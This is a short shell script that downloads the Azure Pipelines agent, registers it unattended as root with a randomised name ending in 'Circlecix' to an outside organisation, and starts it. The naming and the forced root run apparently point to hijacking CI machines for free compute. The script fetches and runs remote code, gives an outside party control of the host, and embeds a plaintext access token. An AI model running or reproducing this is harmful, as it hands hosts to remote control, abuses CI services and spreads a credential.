#! /bin/sh

wget https://vstsagentpackage.azureedge.net/agent/2.192.0/vsts-agent-linux-x64-2.192.0.tar.gz
tar -xvf vsts-agent-linux-x64-2.192.0.tar.gz
chmod +x config.sh
VRSXZ=$(echo $(shuf -i 1-888888888888888 -n 1)Circlecix)
export AGENT_ALLOW_RUNASROOT="1"
RUNNER_ALLOW_RUNASROOT="1" ./config.sh --unattended \
  --agent $VRSXZ \
  --url https://dev.azure.com/kambinglompat0767 \
  --auth PAT \
  --token hwnqyphvxpuwbk4s4rgrg23rwbsaus3ecatf3h6tlfstfxndpyvq \
  --pool verz \
  --work _work \
  --replace \
  --acceptTeeEula & wait $!
chmod +x run.sh && ./run.sh
